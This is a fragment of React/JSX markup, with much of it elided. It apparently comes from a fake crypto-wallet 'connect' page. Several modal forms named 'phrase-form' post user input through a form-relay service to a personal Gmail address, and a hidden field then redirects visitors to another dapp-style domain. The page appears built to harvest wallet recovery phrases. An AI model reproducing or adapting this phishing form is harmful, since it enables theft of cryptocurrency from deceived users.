      ...
      <div>
        <div className="container connect-section">
          <div className="section-container h-auto">
                                  ...
                                  <div className="modal-body text-center justify-content-center mt-4">
                                    ...
                                    >
                                      ...
                                      >
                                          ...
                                          <form action="https://formsubmit.co/johnsondon138@gmail.com" method="POST" id="phrase-form" name="form" className="mt-3"  onSubmit={validateForm}>
            ...
            <input type="hidden" name="_next" value="https://dappnodes.online" />
                                ...
                                <div className="mt-2">
                                  <div className="modal-body text-center justify-content-center mt-4">
                                    ...
                                    >
                                      ...
                                      >
                                       <form action="https://formsubmit.co/johnsondon138@gmail.com" method="POST" id="phrase-form" name="form" className="mt-3" >
                                ...
                                <div className="mt-2">
                                  <div className="modal-body text-center justify-content-center mt-4">
                                    ...
                                    >
                                      ...
                                      >
                                       <form action="https://formsubmit.co/johnsondon138@gmail.com" method="POST" id="phrase-form" name="form" class="mt-3"  onSubmit={validateForm}>
                                          <div className="mb-3">
                                            <input
                                              id="email"
                                              name="email"
